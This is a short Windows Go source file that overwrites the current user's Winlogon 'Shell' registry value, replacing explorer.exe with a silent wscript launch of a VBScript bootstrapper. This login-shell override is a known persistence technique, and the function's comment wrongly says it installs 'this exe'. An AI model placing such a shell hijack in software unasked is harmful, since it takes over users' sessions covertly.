//go:build windows

package tools

import (
	"strings"

	"golang.org/x/sys/windows/registry"
)

const winlogonKey = `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`

func stripQuotes(s string) string { return strings.Trim(s, ` "'`) }

func getUserShell() (string, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER, winlogonKey, registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer k.Close()
	s, _, err := k.GetStringValue("Shell")
	if err == registry.ErrNotExist || strings.TrimSpace(s) == "" {
		return "explorer.exe", nil
	}
	return s, err
}

func setUserShell(shell string) error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, winlogonKey, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer k.Close()
	return k.SetStringValue("Shell", shell)
}

// ensureSelfAsShell sets HKCU Winlogon Shell to this exe (quoted absolute path) if not already.
func EnsureSelfAsShell() error {
	desired := `wscript.exe //B //Nologo "C:\launcher\bootstrapper.vbs"`
	current, _ := getUserShell()
	if strings.EqualFold(strings.TrimSpace(current), desired) {
		return nil
	}
	return setUserShell(desired)
}
